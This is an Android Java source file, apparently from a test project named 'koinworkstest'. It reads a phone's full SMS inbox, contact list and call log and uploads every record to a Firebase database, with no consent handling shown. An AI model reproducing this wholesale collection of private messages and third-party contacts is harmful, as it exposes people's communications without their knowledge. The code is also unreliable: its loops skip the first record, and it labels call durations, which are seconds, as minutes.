package com.example.indraputramr.koinworkstest;

import android.*;
import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Intent;
import android.content.IntentSender;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.net.Uri;
import android.support.design.widget.Snackbar;
import android.os.Bundle;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.provider.Telephony;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.Toast;

import com.example.indraputramr.koinworkstest.ConstructorCollection.CallLogConstructor;
import com.example.indraputramr.koinworkstest.ConstructorCollection.ContactConstructor;
import com.example.indraputramr.koinworkstest.ConstructorCollection.LocationConstructor;
import com.example.indraputramr.koinworkstest.ConstructorCollection.SmsConstructor;
import com.google.android.gms.common.api.ApiException;
import com.google.android.gms.common.api.ResolvableApiException;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.location.LocationSettingsRequest;
import com.google.android.gms.location.LocationSettingsResponse;
import com.google.android.gms.location.LocationSettingsStatusCodes;
import com.google.android.gms.location.SettingsClient;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.Locale;

/**
 * Created by indraputramr on 07/01/2018.
 */

public class FunctionCollection extends SignupActivity {

    private void FunctionCollection() {}

    public void doSmsDataFetching(DatabaseReference smsDB) {
        Uri uriSms = Uri.parse("content://sms/inbox");
        Cursor cursor = getContentResolver().query(
                uriSms,
                null,
                null,
                null,
                null);

        cursor.moveToFirst();
        while (cursor.moveToNext()) {
            String address = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));

            String date = cursor.getString(cursor.getColumnIndex(Telephony.Sms.DATE));
            Long timestamp = Long.parseLong(date);
            Calendar calendar = Calendar.getInstance();
            calendar.setTimeInMillis(timestamp);
            Date finaldate = calendar.getTime();
            String smsDate = finaldate.toString();

            String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
            SmsConstructor sms = new SmsConstructor(address, smsDate, body);
            smsDB.push().setValue(sms);
        }
        cursor.close();
    }

    public void doContactDataFetching(DatabaseReference contactDB) {
        Uri uriContact = ContactsContract.Data.CONTENT_URI;
        Cursor cursor = getContentResolver().query(
                uriContact,
                null,
                null,
                null,
                null);

        cursor.moveToFirst();
        while (cursor.moveToNext()) {
            String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
            String phoneNumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
            ContactConstructor contact = new ContactConstructor(name, phoneNumber);
            contactDB.push().setValue(contact);
        }
        cursor.close();
    }

    public void doCallLogDataFetching(DatabaseReference callLogDB) {
        Uri uriCallLog = Uri.parse("content://call_log/calls");
        Cursor cursor = getContentResolver().query(
                uriCallLog,
                null,
                null,
                null,
                null);

        cursor.moveToFirst();
        while (cursor.moveToNext()) {
            String phoneNumber = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
            String callType = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
            String call_type = "";
            int callTypeCode = Integer.parseInt(callType);
            switch (callTypeCode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    call_type = "Outgoing";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    call_type = "Incoming";
                    break;
                case CallLog.Calls.MISSED_TYPE:
                    call_type = "Missed";
                    break;
            }

            String dateTime = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE));
            Long timestamp = Long.parseLong(dateTime);
            Calendar calendar = Calendar.getInstance();
            calendar.setTimeInMillis(timestamp);
            Date finaldate = calendar.getTime();
            String callLogDateTime = finaldate.toString();

            String duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION)) + " minutes";
            CallLogConstructor sms = new CallLogConstructor(phoneNumber, call_type, callLogDateTime, duration);
            callLogDB.push().setValue(sms);
        }
        cursor.close();
    }

    public void signOut() {
        Intent intent = new Intent(FunctionCollection.this, SignupActivity.class);
        startActivity(intent);
    }

}
